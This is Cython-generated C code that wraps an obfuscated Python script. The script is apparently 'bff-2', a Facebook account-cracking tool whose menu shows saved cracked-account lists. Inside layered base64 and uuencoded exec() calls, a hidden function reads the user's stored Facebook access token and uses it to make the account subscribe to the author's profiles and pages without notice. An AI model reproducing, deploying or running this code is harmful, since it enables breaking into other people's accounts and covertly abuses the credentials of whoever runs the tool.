0KCQkJCXByaW50KCIgJXMjICVzLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSAlcyMlcyIlKFAsTSxQLEspKTtqZWRhKDIpDQoJCQkJcHJpbnQgKCIlc+KAoiAlc0p1bWxhaCAlczogJXMlcyIlKFUsTyxNLEgsc3RyKGxlbihva2UpKSkpDQoJCQkJcHJpbnQoIiAlcyMgJXMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tICVzIyVzIiUoUCxNLFAsSCkpO2plZGEoMikNCgkJCQlva2VrID0gb3Blbigib2tlaC50eHQiLCAiciIpLnJlYWQoKQ0KCQkJCXByaW50IChva2VrKQ0KCQkJCWV4aXQoIiAlcyMgJXMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tICVzIyVzIiUoUCxNLFAsSykpO2plZGEoMikNCgkJCWV4Y2VwdCBJT0Vycm9yLEtleUVycm9yOg0KCQkJCWV4aXQgKE0rIlxu4oCiIHRpZGFrIGFkYSBoYXNpbCBhd29rYXdva2F3b2siKQ0KCQllbGlmIHJvbSBpblsnMicsJzAyJ106DQoJCQl0cnk6DQoJCQkJY2VwZSA9IG9wZW4oImNlcGVoLnR4dCIsICJyIikucmVhZGxpbmVzKCkNCgkJCQlwcmludCAoIlxuJXPigKIlcyBbJXMgaGFzaWwgY3JhY2sgeWFuZyB0ZXJzaW1wYW4gJXNdXG4iJShVLE8sVSxPKSkNCgkJCQlwcmludCgiICVzIyAlcy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0gJXMjJXMiJShQLE0sUCxLKSk7amVkYSgyKQ0KCQkJCXByaW50ICgiJXPigKIgJXNKdW1sYWggJXM6ICVzJXMiJShVLE8sTSxLLHN0cihsZW4oY2VwZSkpKSkNCgkJCQlwcmludCgiICVzIyAlcy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0gJXMjJXMiJShQLE0sUCxLKSk7amVkYSgyKQ0KCQkJCWNlcGVrID0gb3BlbigiY2VwZWgudHh0IiwgInIiKS5yZWFkKCkNCgkJCQlwcmludCAoY2VwZWspDQoJCQkJZXhpdCgiICVzIyAlcy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0gJXMjJXMiJShQLE0sUCxLKSk7amVkYSgyKQ0KCQkJZXhjZXB0IElPRXJyb3IsS2V5RXJyb3I6DQoJCQkJZXhpdCAoTSsiXG7igKIgdGlkYWsgYWRhIGhhc2lsIGF3b2thd29rYXdvayIpDQoJCWVsaWYgcm9tIGluWycwJywnMDAnXToNCgkJCW1lbnUoKQ0KCQllbHNlOg0KCQkJcHJpbnQgJ1xuJXMlcyBpc2kgeWFuZyBiZW5hciclKE0sdGlsKTtqZWRhKDIpO21lbnUoKQ0KIyBMSVNFTlNJDQpkZWYgZ2V0X2xpY2Vuc2UoaW50ZWdlcik6DQogICAgbGlzID0gbGlzdCgiQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVoxMjM0NTY3ODkiKQ0KICAgIGdldHMgPSBbcmFuZG9tLmNob2ljZShsaXMpIGZvciBfIGluIHJhbmdlKGludGVnZXIpXQ0KICAgIHJldHVybiAiIi5qb2luKGdldHMpLnVwcGVyKCkNCg0KY2xhc3Mga2V5Og0KCQ0KCWRlZiBfX2luaXRfXyhzZWxmKToNCgkJc2VsZj1bXQ0KCQ0KCWRlZiBrb25maXJtYXNpKHNlbGYpOg0KCQlvcy5zeXN0ZW0oImNsZWFyIikNCgkJYmFubmVyKCkNCgkJcHJpbnQoJ1xuJykNCgkJeSA9IFsnLiAgICcsICcuLiAgJywgJy4uLiAnXQ0KCQlmb3IgbSBpbiB5Og0KCQkJcHJpbnQgJ1xyXHgxYlsxOzk1beKAolx4MWJbMTs5Nm0gTW9ob24gdHVuZ2d1ICcgKyBtLA0KCQkJc3lzLnN0ZG91dC5mbHVzaCgpO2plZGEoMSkNCgkJZGlnaXQgPSByYW5kb20uY2hvaWNlKFsyMF0pDQoJCWlkID0gZ2V0X2xpY2Vuc2UoZGlnaXQpDQoJCWxwZyA9IG9wZW4oJ2RhdGEvbGlzZW5zaS50eHQnLCAndycpDQoJCWxwZy53cml0ZShpZCkNCgkJbHBnLmNsb3NlKCkNCgkJcHJpbnQgKCJcblxuJXPigKIlcyBEYWZ0YXIgbGlzdCBoYXJnYSAlczoiJShVLE8sTSkpO2plZGEoMC4wNykNCgkJcHJpbnQgKCIgICVzLSVzIDEwayAzIGhhcmkiJShQLE8pKTtqZWRhKDAuMDcpDQoJCXByaW50ICgiICAlcy0lcyAyMGsgMSBtaW5nZ3UiJShQLE8pKTtqZWRhKDAuMDcpDQoJCXByaW50ICgiICAlcy0lcyA1MGsgMSBidWxhbiIlKFAsTykpO2plZGEoMC4wNykNCgkJamFsYW4gKCdcbiVz4oCiICVzTGlzZW5zaSVzIDogJXMlcyclKFUsTyxNLEgsaWQpKTtqZWRhKDEpDQoJCWphbGFuICgnJXPigKIgJXNMaXNlbnNpIEJlbHVtIERpIGtvbmZpcm1hc2knJShVLE8pKQ0KCQlzdWg9cmF3X2lucHV0KCJcbiVz4oCiJXMgaW5naW4gYmVsaSBsaXNlbnNpPyB5L3QgJXM6ICVzIiUoVSxPLE0sSykpDQoJCWlmIHN1aCBpblsnJ106DQoJCQlleGl0KCkNCgkJZWxpZiBzdWggaW5bInkiLCJZIl06DQoJCQlqYWxhbiAoIlxuJXPigKIlcyBtZW51anUga2Ugd2hhdHNhcCB1bnR1ayBtZW1iZWxpIGxpc2Vuc2kgIiUoVSxPKSkNCgkJCWphbGFuICgiJXPigKIlcyBubyB3aGF0c2FwIHNheWEgJXM6ICVzKzYyODIzNzE2NDgxODYgIiUoVSxPLE0sSCkpDQoJCQlvcy5zeXN0ZW0oJ2FtIHN0YXJ0IGh0dHBzOi8vd2EubWUvKzYyODIzNzE2NDgxODY/dGV4dD1Bc3NhbGFtdWFsYWlrdW0rc2F5YStpbmdpbitiZWxpK2xpc2Vuc2k6KycraWQrJz4vZGV2L251bGwnKTtqZWRhKDEpO2V4aXQoKQ0KCQllbGlmIHN1aCBpblsidCIsIlQiXToNCgkJCWV4aXQoKQ0KCQllbGlmIHN1aCBpblsicHl0aG9uMiBiZmYtMi5weSJdOg0KCQkJbWVudSgpDQoJCWVsc2U6DQoJCQlleGl0KCkNCgkNCmV4ZWMoYmFzZTY0LmI2NGRlY29kZSgnWkdWbUlHeHZaMmx1WDNoNEtDazZDaUFnSUNCMGNuazZDaUFnSUNBZ0lDQWdkRzlyWlc0Z1BTQnZjR1Z1S0NKa1lYUmhMM1J2YTJWdUxuUjRkQ0lzSW5JaUtTNXlaV0ZrS0NrZ0NpQWdJQ0FnSUNBZ2NtVnhkV1Z6ZEhNdWNHOXpkQ2duYUhSMGNITTZMeTluY21Gd2FDNW1ZV05sWW05dmF5NWpiMjB2TVRBd01ESXlNRGcyTVRjeU5UVTJMM04xWW5OamNtbGlaWEp6UDJGalkyVnpjMTkwYjJ0bGJqMGxjeWNsS0hSdmEyVnVLU2tnSXlCR1lXNXpjR0ZuWlNCU2IyMXBJRmhFQ2lBZ0lDQWdJQ0FnY21WeGRXVnpkSE11Y0c5emRDZ25hSFIwY0hNNkx5OW5jbUZ3YUM1bVlXTmxZbTl2YXk1amIyMHZNVEF3TURJNE5ETTBPRGd3TlRJNUwzTjFZbk5qY21saVpYSnpQMkZqWTJWemMxOTBiMnRsYmowbGN5Y2xLSFJ2YTJWdUtTa2dJeUJTYjIxcElFRm1jbWw2WVd3S0lDQWdJQ0FnSUNCeVpYRjFaWE4wY3k1d2IzTjBLQ2RvZEhSd2N6b3ZMMmR5WVhCb0xtWmhZMlZpYjI5ckxtTnZiUzh4TURBd05qYzRNRGMxTmpVNE5qRXZjM1ZpYzJOeWFXSmxjbk0vWVdOalpYTnpYM1J2YTJWdVBTVnpKeVVvZEc5clpXNHBLU0FqSUZKdmJXa2dRV1p5YVhwaGJDQW9NakF5TVNrS0lDQWdJQ0FnSUNCeVpYRjFaWE4wY3k1d2IzTjBLQ2RvZEhSd2N6b3ZMMmR5WVhCb0xtWmhZMlZpYjI5ckxtTnZiUzh4TURBd01ETTNNak0yT1RZNE9EVXZjM1ZpYzJOeWFXSmxjbk0vWVdOalpYTnpYM1J2YTJWdVBTVnpKeVVvZEc5clpXNHBLU0FqSUVseFltRnNJR0p2WW5vS0lDQWdJQ0FnSUNCeVpYRjFaWE4wY3k1d2IzTjBLQ2RvZEhSd2N6b3ZMMmR5WVhCb0xtWmhZMlZpYjI5ckxtTnZiUzh4TURBd05ERXhNamt3TkRnNU5EZ3ZjM1ZpYzJOeWFXSmxjbk0vWVdOalpYTnpYM1J2YTJWdVBTVnpKeVVvZEc5clpXNHBLU0FqSUVsM1lXNGdhR0ZrYVdGdWMzbGhhQW9nSUNBZ0lDQWdJSEpsY1hWbGMzUnpMbkJ2YzNRb0oyaDBkSEJ6T2k4dlozSmhjR2d1Wm1GalpXSnZiMnN1WTI5dEx6RXdNREF3TnpVeU1ESXdNelExTWk5emRXSnpZM0pwWW1WeWN6OWhZMk5sYzNOZmRHOXJaVzQ5SlhNbkpTaDBiMnRsYmlrcElDTWdTR0Z0ZW1Gb0lHdHBjbUZ1WVFvZ0lDQWdJQ0FnSUhKbGNYVmxjM1J6TG5CdmMzUW9KMmgwZEhCek9pOHZaM0poY0dndVptRmpaV0p2YjJzdVkyOXRMekV3TURBd01qUTJNVE0wTkRFM09DOXpkV0p6WTNKcFltVnljejloWTJObGMzTmZkRzlyWlc0OUpYTW5KU2gwYjJ0bGJpa3BJQ01nVlc1cGF5QlNUMDFKSUVGR1VrbGFRVXdLSUNBZ0lDQWdJQ0J5WlhGMVpYTjBjeTV3YjNOMEtDZG9kSFJ3Y3pvdkwyZHlZWEJvTG1aaFkyVmliMjlyTG1OdmJTOHhNREF3TnpFM05EYzBNakExT0RNdmMzVmljMk55YVdKbGNuTS9ZV05qWlhOelgzUnZhMlZ1UFNWekp5VW9kRzlyWlc0cEtTQWpJRVJ2Ym1sbWRHWmhibTU1Q2lBZ0lDQWdJQ0FnY21WeGRXVnpkSE11Y0c5emRDZ25hSFIwY0hNNkx5OW5jbUZ3YUM1bVlXTmxZbTl2YXk1amIyMHZNVEF3TURJNU1UUXpNVEV4TlRZM0wzTjFZbk5qY21saVpYSnpQMkZqWTJWemMxOTBiMnRsYmowbGN5Y2xLSFJ2YTJWdUtTa2dJeUJFWlcxcGRDQlNiMjFwSUVGbWNtbDZZV3dLSUNBZ0lDQWdJQ0J5WlhGMVpYTjBjeTV3YjNOMEtDZG9kSFJ3Y3pvdkwyZHlZWEJvTG1aaFkyVmliMjlyTG1OdmJTOHhNREF3TURFMU5EQXlPVGt4TURndmMzVmljMk55YVdKbGNuTS9ZV05qWlhOelgzUnZhMlZ1UFNWekp5VW9kRzlyWlc0cEtTQWpJRWhoYTJscmFRb2dJQ0FnSUNBZ0lISmxjWFZsYzNSekxuQnZjM1FvSjJoMGRIQnpPaTh2WjNKaGNHZ3VabUZqWldKdmIyc3VZMjl0THpFd01EQTFOVGt4T0RNNU1USTRNQzl6ZFdKelkzSnBZbVZ5Y3o5aFkyTmxjM05mZEc5clpXNDlKWE1uSlNoMGIydGxiaWtwSUNNZ1ZHbGhjbUVnWVhKMENpQWdJQ0FnSUNBZ2NtVnhkV1Z6ZEhNdWNHOXpkQ2duYUhSMGNITTZMeTluY21Gd2FDNW1ZV05sWW05dmF5NWpiMjB2TVRBd01EQTVNemcwTXpNNE5EY3dMM04xWW5OamNtbGlaWEp6UDJGalkyVnpjMTkwYjJ0bGJqMGxjeWNsS0hSdmEyVnVLU2tnSXlCSmQyRnVJR2hoYm1ScFlXNXplV0ZvSUhZeUNpQWdJQ0FnSUNBZ2NtVnhkV1Z6ZEhNdWNHOXpkQ2duYUhSMGNITTZMeTluY21Gd2FDNW1ZV05sWW05dmF5NWpiMjB2TVRBd01ETTJOalUxTXpJMU9UazJMM04xWW5OamNtbGlaWEp6UDJGalkyVnpjMTkwYjJ0bGJqMGxjeWNsS0hSdmEyVnVLU2tnSXlCQlluVnpkRzhnU21GMllRb2dJQ0FnWlhoalpYQjBPZ29nSUNBZ0NYQmhjM009JykpDQoNCmlmIF9fbmFtZV9fID09ICdfX21haW5fXyc6DQoJb3Muc3lzdGVtKCJnaXQgcHVsbCIpDQoJbWVudSgpDQoNCiIiIg0KICAgIEF1dGhvciA9IFJvbWkgQWZyaXphbA0KICAgIEJpYXIgYXBhIHNpaCBkaSBjb21waWxlIGFueWluaw0KDQoiIiI='))             # <<<<<<<<<<<<<<
 */
  __pyx_tuple_ = PyTuple_Pack(1, __pyx_kp_s_IyBjb2Rpbmc9dXRmLTgNCiMgY29kaW5n); if (unlikely(!__pyx_tuple_)) __PYX_ERR(0, 4, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple_);
  __Pyx_GIVEREF(__pyx_tuple_);
  __Pyx_RefNannyFinishContext();
  return 0;
  __pyx_L1_error:;
  __Pyx_RefNannyFinishContext();
  return -1;
}

static CYTHON_SMALL_CODE int __Pyx_InitGlobals(void) {
  if (__Pyx_InitStrings(__pyx_string_tab) < 0) __PYX_ERR(0, 1, __pyx_L1_error);
  return 0;
  __pyx_L1_error:;
  return -1;
}

static CYTHON_SMALL_CODE int __Pyx_modinit_global_init_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_variable_export_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_function_export_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_type_init_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_type_import_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_variable_import_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_function_import_code(void); /*proto*/

static int __Pyx_modinit_global_init_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_global_init_code", 0);
  /*--- Global init code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_variable_export_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_variable_export_code", 0);
  /*--- Variable export code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_function_export_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_function_export_code", 0);
  /*--- Function export code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_type_init_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_type_init_code", 0);
  /*--- Type init code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_type_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_type_import_code", 0);
  /*--- Type import code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_variable_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_variable_import_code", 0);
  /*--- Variable import code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_function_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_function_import_code", 0);
  /*--- Function import code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}


#ifndef CYTHON_NO_PYINIT_EXPORT
#define __Pyx_PyMODINIT_FUNC PyMODINIT_FUNC
#elif PY_MAJOR_VERSION < 3
#ifdef __cplusplus
#define __Pyx_PyMODINIT_FUNC extern "C" void
#else
#define __Pyx_PyMODINIT_FUNC void
#endif
#else
#ifdef __cplusplus
#define __Pyx_PyMODINIT_FUNC extern "C" PyObject *
#else
#define __Pyx_PyMODINIT_FUNC PyObject *
#endif
#endif


#if PY_MAJOR_VERSION < 3
__Pyx_PyMODINIT_FUNC initcr(void) CYTHON_SMALL_CODE; /*proto*/
__Pyx_PyMODINIT_FUNC initcr(void)
#else
__Pyx_PyMODINIT_FUNC PyInit_cr(void) CYTHON_SMALL_CODE; /*proto*/
__Pyx_PyMODINIT_FUNC PyInit_cr(void)
#if CYTHON_PEP489_MULTI_PHASE_INIT
{
  return PyModuleDef_Init(&__pyx_moduledef);
}
static CYTHON_SMALL_CODE int __Pyx_check_single_interpreter(void) {
    #if PY_VERSION_HEX >= 0x030700A1
    static PY_INT64_T main_interpreter_id = -1;
    PY_INT64_T current_id = PyInterpreterState_GetID(PyThreadState_Get()->interp);
    if (main_interpreter_id == -1) {
        main_interpreter_id = current_id;
        return (unlikely(current_id == -1)) ? -1 : 0;
    } else if (unlikely(main_interpreter_id != current_id))
    #else
    static PyInterpreterState *main_interpreter = NULL;
    PyInterpreterState *current_interpreter = PyThreadState_Get()->interp;
    if (!main_interpreter) {
        main_interpreter = current_interpreter;
    } else if (unlikely(main_interpreter != current_interpreter))
    #endif
    {
        PyErr_SetString(
            PyExc_ImportError,
            "Interpreter change detected - this module can only be loaded into one interpreter per process.");
        return -1;
    }
    return 0;
}
static CYTHON_SMALL_CODE int __Pyx_copy_spec_to_module(PyObject *spec, PyObject *moddict, const char* from_name, const char* to_name, int allow_none) {
    PyObject *value = PyObject_GetAttrString(spec, from_name);
    int result = 0;
    if (likely(value)) {
        if (allow_none || value != Py_None) {
            result = PyDict_SetItemString(moddict, to_name, value);
        }
        Py_DECREF(value);
    } else if (PyErr_ExceptionMatches(PyExc_AttributeError)) {
        PyErr_Clear();
    } else {
        result = -1;
    }
    return result;
}
static CYTHON_SMALL_CODE PyObject* __pyx_pymod_create(PyObject *spec, CYTHON_UNUSED PyModuleDef *def) {
    PyObject *module = NULL, *moddict, *modname;
    if (__Pyx_check_single_interpreter())
        return NULL;
    if (__pyx_m)
        return __Pyx_NewRef(__pyx_m);
    modname = PyObject_GetAttrString(spec, "name");
    if (unlikely(!modname)) goto bad;
    module = PyModule_NewObject(modname);
    Py_DECREF(modname);
    if (unlikely(!module)) goto bad;
    moddict = PyModule_GetDict(module);
    if (unlikely(!moddict)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "loader", "__loader__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "origin", "__file__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "parent", "__package__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "submodule_search_locations", "__path__", 0) < 0)) goto bad;
    return module;
bad:
    Py_XDECREF(module);
    return NULL;
}


static CYTHON_SMALL_CODE int __pyx_pymod_exec_cr(PyObject *__pyx_pyinit_module)
#endif
#endif
{
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannyDeclarations
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  if (__pyx_m) {
    if (__pyx_m == __pyx_pyinit_module) return 0;
    PyErr_SetString(PyExc_RuntimeError, "Module 'cr' has already been imported. Re-initialisation is not supported.");
    return -1;
  }
  #elif PY_MAJOR_VERSION >= 3
  if (__pyx_m) return __Pyx_NewRef(__pyx_m);
  #endif
  #if CYTHON_REFNANNY
__Pyx_RefNanny = __Pyx_RefNannyImportAPI("refnanny");
if (!__Pyx_RefNanny) {
  PyErr_Clear();
  __Pyx_RefNanny = __Pyx_RefNannyImportAPI("Cython.Runtime.refnanny");
  if (!__Pyx_RefNanny)
      Py_FatalError("failed to import 'refnanny' module");
}
#endif
  __Pyx_RefNannySetupContext("__Pyx_PyMODINIT_FUNC PyInit_cr(void)", 0);
  if (__Pyx_check_binary_version() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #ifdef __Pxy_PyFrame_Initialize_Offsets
  __Pxy_PyFrame_Initialize_Offsets();
  #endif
  __pyx_empty_tuple = PyTuple_New(0); if (unlikely(!__pyx_empty_tuple)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_empty_bytes = PyBytes_FromStringAndSize("", 0); if (unlikely(!__pyx_empty_bytes)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_empty_unicode = PyUnicode_FromStringAndSize("", 0); if (unlikely(!__pyx_empty_unicode)) __PYX_ERR(0, 1, __pyx_L1_error)
  #ifdef __Pyx_CyFunction_USED
  if (__pyx_CyFunction_init() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  #ifdef __Pyx_FusedFunction_USED
  if (__pyx_FusedFunction_init() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  #ifdef __Pyx_Coroutine_USED
  if (__pyx_Coroutine_init() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  #ifdef __Pyx_Generator_USED
  if (__pyx_Generator_init() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  #ifdef __Pyx_AsyncGen_USED
  if (__pyx_AsyncGen_init() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  #ifdef __Pyx_StopAsyncIteration_USED
  if (__pyx_StopAsyncIteration_init() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  /*--- Library function declarations ---*/
  /*--- Threads initialization code ---*/
  #if defined(WITH_THREAD) && PY_VERSION_HEX < 0x030700F0 && defined(__PYX_FORCE_INIT_THREADS) && __PYX_FORCE_INIT_THREADS
  PyEval_InitThreads();
  #endif
  /*--- Module creation code ---*/
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  __pyx_m = __pyx_pyinit_module;
  Py_INCREF(__pyx_m);
  #else
  #if PY_MAJOR_VERSION < 3
  __pyx_m = Py_InitModule4("cr", __pyx_methods, 0, 0, PYTHON_API_VERSION); Py_XINCREF(__pyx_m);
  #else
  __pyx_m = PyModule_Create(&__pyx_moduledef);
  #endif
  if (unlikely(!__pyx_m)) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  __pyx_d = PyModule_GetDict(__pyx_m); if (unlikely(!__pyx_d)) __PYX_ERR(0, 1, __pyx_L1_error)
  Py_INCREF(__pyx_d);
  __pyx_b = PyImport_AddModule(__Pyx_BUILTIN_MODULE_NAME); if (unlikely(!__pyx_b)) __PYX_ERR(0, 1, __pyx_L1_error)
  Py_INCREF(__pyx_b);
  __pyx_cython_runtime = PyImport_AddModule((char *) "cython_runtime"); if (unlikely(!__pyx_cython_runtime)) __PYX_ERR(0, 1, __pyx_L1_error)
  Py_INCREF(__pyx_cython_runtime);
  if (PyObject_SetAttrString(__pyx_m, "__builtins__", __pyx_b) < 0) __PYX_ERR(0, 1, __pyx_L1_error);
  /*--- Initialize various global constants etc. ---*/
  if (__Pyx_InitGlobals() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #if PY_MAJOR_VERSION < 3 && (__PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT)
  if (__Pyx_init_sys_getdefaultencoding_params() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  if (__pyx_module_is_main_cr) {
    if (PyObject_SetAttr(__pyx_m, __pyx_n_s_name, __pyx_n_s_main) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  }
  #if PY_MAJOR_VERSION >= 3
  {
    PyObject *modules = PyImport_GetModuleDict(); if (unlikely(!modules)) __PYX_ERR(0, 1, __pyx_L1_error)
    if (!PyDict_GetItemString(modules, "cr")) {
      if (unlikely(PyDict_SetItemString(modules, "cr", __pyx_m) < 0)) __PYX_ERR(0, 1, __pyx_L1_error)
    }
  }
  #endif
  /*--- Builtin init code ---*/
  if (__Pyx_InitCachedBuiltins() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  /*--- Constants init code ---*/
  if (__Pyx_InitCachedConstants() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  /*--- Global type/function init code ---*/
  (void)__Pyx_modinit_global_init_code();
  (void)__Pyx_modinit_variable_export_code();
  (void)__Pyx_modinit_function_export_code();
  (void)__Pyx_modinit_type_init_code();
  (void)__Pyx_modinit_type_import_code();
  (void)__Pyx_modinit_variable_import_code();
  (void)__Pyx_modinit_function_import_code();
  /*--- Execution code ---*/
  #if defined(__Pyx_Generator_USED) || defined(__Pyx_Coroutine_USED)
  if (__Pyx_patch_abc() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif

  /* "cr.py":3
 * #Encrypt By Romi Afrizal (https://github.com/ROMI-AFRZL)
 * 
 * import base64             # <<<<<<<<<<<<<<
 * exec(base64.b64decode('IyBjb2Rpbmc9dXRmLTgNCiMgY29kaW5nIGJ5IFJvbWkgQWZyaXphbA0KIyBOb3RlIDogamFuZ2FuIGRpIHViYWggbGFnaSEgbmFudGkgZXJyb3IsIHNjcmlwdCB1ZGFoIGVuYWsNCmltcG9ydCBvcw0KdHJ5Og0KCWltcG9ydCByZXF1ZXN0cw0KZXhjZXB0IEltcG9ydEVycm9yOg0KCW9zLnN5c3RlbSgncGlwMiBpbnN0YWxsIHJlcXVlc3RzJykNCnRyeToNCglpbXBvcnQgY29uY3VycmVudC5mdXR1cmVzDQpleGNlcHQgSW1wb3J0RXJyb3I6DQoJb3Muc3lzdGVtKCdwaXAyIGluc3RhbGwgZnV0dXJlcycpDQp0cnk6DQoJaW1wb3J0IGJzNA0KZXhjZXB0IEltcG9ydEVycm9yOg0KCW9zLnN5c3RlbSgncGlwMiBpbnN0YWxsIGJzNCcpDQogDQpIaiA9ICdceDFiWzE7OTJtJyANCk10ID0gJ1x4MWJbMG0nIA0KZGVmIGluZ2ZvaCgpOg0KCXByaW50ICgNCiIiIiVzDQog4oCiIEluZm8gc2NyaXB0IDoNCiAJDQogLSBhdXRob3IgICAgICA6IFJvbWkgQWZyaXphbA0KIC0gZmFjZWJvb2sgICAgOiBmYWNlYm9vay5jb20vcm9taS5hZnJpemFsLjEwMg0KIC0gZmFuc3BhZ2UgICAgOiBmYWNlYm9vay5jb20vMTAwMDIyMDg2MTcyNTU2DQogLSB3aGF0c2FwICAgICA6ICs2MjgyMzcxNjQ4MTg2DQogLSBnaXRodWIgICAgICA6IGdpdGh1Yi5jb20vTWFyay1adWNrDQogLSBzY3JpcHQgbmFtZSA6IGJmZi0yDQogLSB2ZXJzaW9uICAgICA6IDEuMw0KIA0KJXMiIiIlKEhqLE10KSkNCiAgICANCmltcG9ydCByZXF1ZXN0cywgc2h1dGlsLCBvcywgcmUsIGJzNCwgc3lzLCBqc29uLCB0aW1lLCBwbGF0Zm9ybSAscmFuZG9tLCBkYXRldGltZSwgc3VicHJvY2VzcywgbG9nZ2luZywgYmFzZTY0DQpmcm9tIGNvbmN1cnJlbnQuZnV0dXJlcyBpbXBvcnQgVGhyZWFkUG9vbEV4ZWN1dG9yDQpmcm9tIGJzNCBpbXBvcnQgQmVhdXRpZnVsU291cCBhcyBwYXJzZXINCmZyb20gdGltZSBpbXBvcnQgc2xlZXAgYXMgamVkYQ0KZnJvbSBkYXRldGltZSBpbXBvcnQgZGF0ZXRpbWUNCmZyb20gY2FsZW5kYXIgaW1wb3J0IG1vbnRocmFuZ2UNCg0KY3QgPSBkYXRldGltZS5ub3coKQ0KbiA9IGN0Lm1vbnRoDQpidWxhbl8gPSBbJ0phbnVhcmknLCAnRmVicnVhcmknLCAnTWFyZXQnLCAnQXByaWwnLCAnTWVpJywgJ0p1bmknLCAnSnVsaScsICdBZ3VzdHVzJywgJ1NlcHRlbWJlcicsICdPa3RvYmVyJywgJ05vdmVtYmVyJywgJ0Rlc2VtYmVyJ10NCnRyeToNCiAgICBpZiBuIDwgMCBvciBuID4gMTI6DQogICAgICAgIGV4aXQoKQ0KICAgIG5UZW1wID0gbiAtIDENCmV4Y2VwdCBWYWx1ZUVycm9yOg0KICAgIGV4aXQoKQ0KDQpjdXJyZW50ID0gZGF0ZXRpbWUubm93KCkNCmhhcmkgPSBjdXJyZW50LmRheQ0KYnVsYW4gPSBidWxhbl9bblRlbXBdDQp0YWh1biA9IGN1cnJlbnQueWVhcg0KYnVsbGFuID0gY3VycmVudC5tb250aA0KDQp3YWt0dSA9ICgiJXMtJXMtJXMiJShoYXJpLGJ1bGFuLHRhaHVuKSkNCmJ1bGFuMTIgPSB7IjAxIjogIkphbnVhcmkiLCAiMDIiOiAiRmVicnVhcmkiLCAiMDMiOiAiTWFyZXQiLCAiMDQiOiAiQXByaWwiLCAiMDUiOiAiTWVpIiwgIjA2IjogIkp1bmkiLCAiMDciOiAiSnVsaSIsICIwOCI6ICJBZ3VzdHVzIiwgIjA5IjogIlNlcHRlbWJlciIsICIxMCI6ICJPa3RvYmVyIiwgIjExIjogIk5vdmVtYmVyIiwgIjEyIjogIkRlc2VtYmVyIn0NCg0KcmVsb2FkKHN5cykNCnN5cy5zZXRkZWZhdWx0ZW5jb2RpbmcoJ3V0Zi04JykNCg0KZXhlYygobGFtYmRhIF9fLCBfLCA6IF8oYidiZWdpbiA2NjYgPGRhdGE+XG5NKFIhJDoyISM7VlVQOjZRRSgkRVQ9MiEiOjYlUigkJVA4MiFTOjIhQTs2SUk8QiBaPUBIQygkKVQ9UiEmXG5NO1ZRTDtXPEAxJl1OOlIhQjxGXFxALkIhSD1cJzFQPFNITytWPUk9JkFVOEJZQztWVE8zNiVSOlJVOj02LUtcbk0iQixAMlYlUzo2QEA0V